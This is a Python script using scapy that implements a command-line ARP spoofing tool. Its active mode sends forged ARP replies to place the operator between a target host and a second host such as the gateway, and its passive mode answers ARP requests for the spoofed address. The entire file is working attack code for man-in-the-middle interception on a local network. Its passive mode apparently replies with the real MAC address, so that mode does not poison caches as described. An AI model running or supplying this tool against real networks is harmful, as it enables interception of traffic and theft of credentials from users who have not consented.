#!/usr/bin/python

import scapy.all as scapy
import argparse
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface, rate=1, passive=False):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.rate = rate
        self.passive = passive

    def get_mac(self, ip):
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        if len(answer) == 0:
            print(Fore.RED + f"[!] No response for ARP request to {ip}")
            return None
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        mac = self.get_mac(target)
        if mac is None:
            return
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        if dest_mac is None or source_mac is None:
            return
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, count=5, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

    def respond_arp(self, pkt):
        # Responde solo a peticiones ARP que apunten a spoof_ip (ej. gateway)
        if pkt.haslayer(scapy.ARP) and pkt[scapy.ARP].op == 1:  # who-has (request)
            if pkt[scapy.ARP].pdst == self.spoof_ip:
                mac = self.get_mac(self.spoof_ip)
                if mac is None:
                    return
                response = scapy.ARP(op=2,
                                     pdst=pkt[scapy.ARP].psrc,
                                     hwdst=pkt[scapy.ARP].hwsrc,
                                     psrc=self.spoof_ip,
                                     hwsrc=mac)
                scapy.send(response, iface=self.interface, verbose=False)
                print(Fore.CYAN + f"[+] Responded to ARP request from {pkt[scapy.ARP].psrc}")

    def run_active(self):
        print(Fore.GREEN + f"[*] Starting active ARP spoofing at {self.rate} pkt/s...")
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)
                self.spoof(self.spoof_ip, self.target_ip)
                time.sleep(1 / self.rate)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored. Exiting.")

    def run_passive(self):
        print(Fore.GREEN + f"[*] Starting passive ARP responder on interface {self.interface}...")
        try:
            scapy.sniff(iface=self.interface, filter="arp", store=False, prn=self.respond_arp)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Detected CTRL+C. Exiting.")

    def run(self):
        if self.passive:
            self.run_passive()
        else:
            self.run_active()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool with rate control and passive mode.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., gateway IP).")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0).")
    parser.add_argument("-r", "--rate", type=float, default=1.0, help="Packets per second for active spoofing (default: 1).")
    parser.add_argument("-p", "--passive", action="store_true", help="Enable passive mode: only respond to ARP requests.")
    
    args = parser.parse_args()

    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface,
                         rate=args.rate, passive=args.passive)
    spoofer.run()
